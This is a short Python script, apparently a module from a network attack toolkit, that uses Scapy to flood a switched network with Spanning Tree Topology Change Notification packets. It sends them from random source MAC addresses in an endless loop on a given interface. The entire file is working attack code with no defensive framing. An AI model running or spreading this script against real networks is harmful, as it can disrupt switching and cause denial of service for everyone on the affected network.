# -*- coding: utf-8 -*-
 
from scapy.layers.l2 import Dot3, LLC, STP
from scapy.all import sendp, RandMAC
 
 
# --------------------------------------------------------------------------
#                           STP TCN ATTACK
# --------------------------------------------------------------------------
 
def run(inter):
    """
    This function launch STP TCN ATTACK
    :param inter: interface to be launched the attack
    :type inter: str
    """
 
    interface = str(inter)
    if len(interface) > 0:
        try:
            while 1:
                # dst=Ethernet Multicast address used for spanning tree protocol
                srcMAC = str(RandMAC())     # Random MAC in each iteration
                p_ether = Dot3(dst="01:00:0c:cc:cc:cd", src=srcMAC)
                p_llc = LLC()
                p_stp = STP(bpdutype=0x80)   # TCN packet
                pkt = p_ether/p_llc/p_stp   # STP packet structure
 
                sendp(pkt, iface=interface, verbose=0)
 
        except KeyboardInterrupt:
            pass
 
 
def run_attack(interface):
    """ This function is used for launch the STP TCN attack
    :param config: GlobalParameters option instance
    :type config: `GlobalParameters`
 
    """
    print(f"the interface being used to attack = {interface}")
    run(interface)

if __name__ == "__main__":
    run_attack("en4")